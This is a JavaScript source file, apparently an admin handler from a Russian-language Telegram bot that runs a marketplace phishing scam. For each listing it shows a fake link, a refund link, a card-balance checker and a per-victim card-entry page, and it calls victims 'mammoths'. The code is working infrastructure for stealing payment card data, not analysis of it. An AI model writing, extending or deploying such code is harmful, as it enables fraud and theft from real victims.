const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const { Ad } = require("../../database");
const locale = require("../../locale");

module.exports = async (ctx, id, userId = null) => {
  try {
    const ad = await Ad.findOne({
      where: { id },
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "country",
              required: true,
            },
          ],
        },
      ],
    });

    if (!ad)
      return ctx
        .replyOrEdit("❌ Объявление не найдено", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "◀️ Назад",
                userId ? `admin_user_${userId}_ads_1` : `admin_ads_1`
              ),
            ],
          ]),
        })
        .catch((err) => err);

    const fakeLinkUrl = `https://${ad.service.domain}/${ad.id}`;
    const refundLinkUrl = `https://${ad.service.domain}/refund/${ad.id}`;

    const shortLinkDisplay = ad.shortLink
      ? `<a href="${ad.shortLink}">Перейти</a>\n╰ <code>${escapeHTML(ad.shortLink)}</code>`
      : `<i>отсутствует</i>`;

    const personalLinkDisplay = ad.myDomainLink
      ? `<a href="${ad.myDomainLink}">Перейти</a>\n╰ <code>${escapeHTML(ad.myDomainLink)}</code>`
      : `<i>отсутствует</i>`;

    const adLinkDisplay = ad.adLink
      ? `<a href="${ad.adLink}">Перейти</a>\n╰ <code>${escapeHTML(ad.adLink)}</code>`
      : `<i>отсутствует</i>`;

    let text = `<b>${escapeHTML(ad.service.title)}</b> | 🆔 <code>${ad.id}</code> | <b>🔍 #id${ad.id}</b>

🏷️ Название: <b><b>${escapeHTML(ad.title || "отсутствует")}</b></b>
💰 Цена: <b><b>${escapeHTML(ad.price || "отсутствует")}</b></b>
👤 Имя: <b><b>${escapeHTML(ad.name || "отсутствует")}</b></b>
📞 Телефон: <b><b>${escapeHTML(ad.phone || "отсутствует")}</b></b>
📍 Адрес: <b><b>${escapeHTML(ad.address || "отсутствует")}</b></b>
💳 Чекер баланса: <b><b>${ad.balanceChecker ? "включен" : "выключен"}</b></b>
⛓️‍💥 Мультиссылка: <b><b>${ad.billing ? "страница ввода карты генерируется с новым ID для каждого мамонта." : "выключен"}</b></b>

🔗 Оригинальная ссылка: ${adLinkDisplay}

🔗 Фейк-ссылка: <a href="${fakeLinkUrl}">Перейти</a>
╰ <code>${fakeLinkUrl}</code>

↩️ Ссылка возврата: <a href="${refundLinkUrl}">Перейти</a>
╰ <code>${refundLinkUrl}</code>

✂️ Сокращённая ссылка: ${shortLinkDisplay}

🌐 Личный домен: ${personalLinkDisplay}`;
    return ctx
      .replyOrEdit(text, {
        disable_web_page_preview: true,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("👤 Перейти к пользователю", `admin_user_${ad.userId}`)],
          [
            Markup.callbackButton(
              `❌ Удалить объявление`,
              `admin_${userId ? `user_${userId}_` : ""}ad_${ad.id}_delete`
            ),
          ],
          [
            Markup.callbackButton(
              "◀️ Назад",
              userId ? `admin_user_${ad.userId}_ads_1` : `admin_ads_1`
            ),
          ],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
};
